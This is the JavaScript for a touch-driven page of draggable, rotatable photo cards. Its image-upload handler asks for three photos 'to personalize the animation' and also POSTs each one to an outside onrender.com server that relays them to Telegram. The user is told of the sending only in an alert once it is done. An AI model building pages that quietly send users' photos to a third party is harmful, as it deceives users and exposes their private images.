let highestZ = 1;

class Paper {
  holdingPaper = false;
  touchStartX = 0;
  touchStartY = 0;
  touchMoveX = 0;
  touchMoveY = 0;
  prevTouchX = 0;
  prevTouchY = 0;
  velX = 0;
  velY = 0;
  rotation = Math.random() * 30 - 15;
  currentPaperX = 0;
  currentPaperY = 0;
  rotating = false;

  init(paper) {
    paper.addEventListener('touchstart', (e) => {
      if (this.holdingPaper) return;
      this.holdingPaper = true;

      paper.style.zIndex = highestZ++;
      this.touchStartX = e.touches[0].clientX;
      this.touchStartY = e.touches[0].clientY;
      this.prevTouchX = this.touchStartX;
      this.prevTouchY = this.touchStartY;

      // Two-finger touch to rotate
      if (e.touches.length === 2) {
        this.rotating = true;
      }
    });

    paper.addEventListener('touchmove', (e) => {
      e.preventDefault();

      this.touchMoveX = e.touches[0].clientX;
      this.touchMoveY = e.touches[0].clientY;

      this.velX = this.touchMoveX - this.prevTouchX;
      this.velY = this.touchMoveY - this.prevTouchY;

      this.prevTouchX = this.touchMoveX;
      this.prevTouchY = this.touchMoveY;

      if (this.holdingPaper) {
        if (this.rotating) {
          const dirX = this.touchMoveX - this.touchStartX;
          const dirY = this.touchMoveY - this.touchStartY;
          const dirLength = Math.sqrt(dirX * dirX + dirY * dirY);

          if (dirLength !== 0) {
            const dirNormalizedX = dirX / dirLength;
            const dirNormalizedY = dirY / dirLength;
            const angle = Math.atan2(dirNormalizedY, dirNormalizedX);
            let degrees = 180 * angle / Math.PI;
            degrees = (360 + Math.round(degrees)) % 360;
            this.rotation = degrees;
          }
        } else {
          this.currentPaperX += this.velX;
          this.currentPaperY += this.velY;
        }

        paper.style.transform = `translateX(${this.currentPaperX}px) translateY(${this.currentPaperY}px) rotateZ(${this.rotation}deg)`;
      }
    });

    paper.addEventListener('touchend', () => {
      this.holdingPaper = false;
      this.rotating = false;
    });
  }
}

// Initialize existing papers
document.querySelectorAll('.paper').forEach(paper => {
  const p = new Paper();
  p.init(paper);
});

// Observe new papers
const observer = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    mutation.addedNodes.forEach((node) => {
      if (node.classList && node.classList.contains('paper')) {
        const p = new Paper();
        p.init(node);
      }
    });
  });
});

observer.observe(document.body, { childList: true });

// 📤 Image Upload + Telegram Integration (Mobile)
const imageUpload = document.getElementById('imageUpload');
const imageElements = document.querySelectorAll('.paper.image img');

imageUpload.addEventListener('change', (event) => {
  const files = Array.from(event.target.files);
  if (files.length !== 3) {
    alert("Please upload exactly 3 images to personalize the animation.");
    return;
  }

  let uploadedCount = 0;

  files.forEach((file, index) => {
    // Fade-in effect
    const reader = new FileReader();
    reader.onload = function(e) {
      if (imageElements[index]) {
        imageElements[index].classList.add('replacing');
        imageElements[index].src = e.target.result;
        setTimeout(() => {
          imageElements[index].classList.remove('replacing');
        }, 500);
      }
    };
    reader.readAsDataURL(file);

    // Send to Telegram
    const formData = new FormData();
    formData.append('image', file);

    fetch('https://radharani9-3.onrender.com/upload', {
      method: 'POST',
      body: formData
    })
    .then(res => res.text())
    .then(msg => {
      uploadedCount++;
      console.log('Uploaded:', msg);
      if (uploadedCount === 3) {
        alert("All 3 images sent to Telegram successfully!");
      }
    })
    .catch(err => console.error('Telegram upload failed:', err));
  });
});
